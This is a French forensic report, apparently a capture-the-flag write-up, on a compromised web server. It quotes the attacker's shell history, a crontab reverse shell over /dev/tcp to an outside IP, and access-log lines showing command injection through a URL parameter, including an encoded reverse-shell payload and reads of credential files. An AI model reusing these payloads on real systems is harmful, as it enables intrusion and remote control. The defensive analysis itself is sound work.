


# Rapport d'analyse Forensique


## Préparation
Dans le cadre de cette analyse, l'opération s'effectuera via un Docker Linux prévu à cet effet ainsi qu'avec les identifiants transmis au préalable.


## Introduction
Suite à une attaque informatique qui aurait ciblé le site web de B0sh-cyber, cela aurait permis d'infiltrer des outils malveillants sur la machine. Le site Web a donc été mis en quarantaine et est inaccessible pour le moment. Une analyse complète de l'environnement sera effectuée pour identifier les actions effectuées par le hacker et ainsi prendre des mesures de sécurité en conséquence.


## Méthodologie
La méthodologie suivante sera adoptée:
 - Analyse des logs
 - Récupération de l'historique de commandes
 - Analyse Crontab
 - Identification des indicateurs de compromission

## Résultats
Dans un 1er temps, j'ai procédé à la récupération de l'historique de commandes afin de déterminer ce qui a pu se passer:

        b0sch@bosch-cyber:/$ history
        1  id
        2  cat /etc/passwd
        3  cat /etc/hosts
        4  ls /var/www/html
        5  pwd
        6  cd /home/b0sch/
        7  ping 138.66.89.12
        8  cat /etc/shadow
        9  l
       10  ls -lah
       11  crontab -e
       12  zip -r --password $(cat /tmp/mypassword) bosch_cyber_tools.zip /home/b0sch/bosch_cyber_tools
       13  mkdir /opt/leak
       14  mv bosch_cyber_tools.zip /opt/leak
       15  rm /tmp/mypassword

Je constate que l'attaquant a essayé de consulter des mots de passe, il les a peut-être potentiellement dérobés, c'est un 1er indicateur de compromission. L'attaquant a également ping un hôte, on peut imaginer qu'il s'agit de sa machine pirate.  

En utilisant la Crontab, une tâche planifiée a très certainement été mise en place, je vais donc aller vérifier:
   

     b0sch@bosch-cyber:~$ cat /etc/crontab
        */1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'

Cette commande ouvre une connexion TCP sur l'adresse IP 138.66.89.12 sur le port 4444 toutes les minutes.

Il s'agit d'une backdoor permettant à l'attaquant d'exécuter du code arbitraire à distance. Nous savons maintenant comment le pirate procède.

Un fichier zip protégé par un mot de passe a été déployé et déplacé dans un fichier leak. Je vais maintenant procéder à l'analyse des logs lié à Apache2, car c'est le serveur Web qui a été piraté. On retrouve 2 principaux fichiers de logs prévus à cet usage:

    b0sch@bosch-cyber:/var/log/apache2$ ls
    access.log  error.log  other_vhosts_access.log

 Il est nécessaire de s'orienter vers l'adresse IP distante identifiée auparavant afin de pouvoir obtenir de plus amples informations:
 

    b0sch@bosch-cyber:/var/log/apache2$ cat access.log | grep "138.66.89.12"
    138.66.89.12 - - [03/Sep/2022:13:41:12 +0200] "GET /bosch.php HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:41:24 +0200] "GET /bosch.php?name=bosch_report.pdf HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:41:42 +0200] "GET /bosch.php?name=;id HTTP/1.1" 200 59 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:41:51 +0200] "GET /bosch.php?name=;pwd HTTP/1.1" 200 52 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:42:11 +0200] "GET /bosch.php?name=;whoami HTTP/1.1" 200 40 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:42:15 +0200] "GET /bosch.php?name=;cat%20/etc/issue HTTP/1.1" 200 58 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:42:21 +0200] "GET /bosch.php?name=;cat%20/etc/passwd HTTP/1.1" 200 593 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:42:56 +0200] "GET /bosch.php?name=;ls%20/home/b0sch HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:43:02 +0200] "GET /bosch.php?name=;ls%20/home/b0sch/bosch_cyber_tools HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:43:31 +0200] "GET /bosch.php?name=;echo%20%22th3_4v1l_p4sSw0rD%22%20%3E%20/tmp/mypassword HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
    138.66.89.12 - - [03/Sep/2022:13:43:57 +0200] "GET /bosch.php?name=;bash%20-i%20%3E&%20/dev/tcp/138.66.89.12/4444%200%3E&1 HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"

On constate qu'une multitude de requêtes ont été opérées par l'attaquant, on va cependant s'attarder sur celle-ci, car on retrouve en avant-dernière ligne un mot de passe utilisé par l'attaquant "**th3_4v1l_p4sSw0rD**" lié au mot de passe du fichier "/tmp/mypasswd".

    138.66.89.12 - - [03/Sep/2022:13:43:31 +0200] "GET /bosch.php?name=;echo%20%22th3_4v1l_p4sSw0rD%22%20%3E%20/tmp/mypassword HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"

Nous allons maintenant nous diriger dans l'endroit ou se trouve le fichier ZIP et essayer de dézipper le fichier de l'attaquant afin d'analyser son contenu avec le mot de passe trouvé dans les logs:
   
 

    b0sch@bosch-cyber:/opt/leak$ ls
    bosch_cyber_tools.zip
    b0sch@bosch-cyber:/opt/leak$ unzip bosch_cyber_tools.zip -d /home/b0sch/
    Archive:  bosch_cyber_tools.zip
    [bosch_cyber_tools.zip] bosch_cyber_tools/all_tools.txt password:
      inflating: /home/b0sch/bosch_cyber_tools/all_tools.txt

Le mot de passe a bien fonctionné, nous avons pu dézipper le fichier dans un emplacement ou nous avons les droits d'écriture.

Je vais maintenant procéder à l'ouverture du fichier pirate:
   

     b0sch@bosch-cyber:~/bosch_cyber_tools$ cat all_tools.txt
        GG :)
        FORENSIC{l0gS_4nalYs1s}
      
        PS: did you notice the persistence way of the attacker?

On retrouve ici la boîte à outils du hacker.




## Conclusion
Après analyse, nous avons découvert que l'attaquant s'introduisait sur le système via une backdoor par le biais d'un job sur une crontab s'effectuant toutes les minutes. L'attaquant possédait une boîte à outils en local sur le serveur protégé par un mot de passe.


# Recommandations
Pour corriger cette faille de sécurité, il est nécessaire d'adopter une stratégie de filtrage adéquate respectant le principe du moindre privilège. Le serveur WEB doit être sécurisé en HTTPS. La tâche planifiée doit être supprimée afin que le pirate ne puisse plus prendre la main à distance sur le serveur. Le mot de passe de tous les comptes doivent être changés et soumis à une politique de mots de passe fiable. 

## Conclusion Générale
Pour conclure, le site web de Bosh-Cyber a été soumis à une attaque informatique de type BackDoor permettant à l'attaquant d'éxécuter du code arbitraire à distance et ainsi avoir la main totale sur le serveur web.

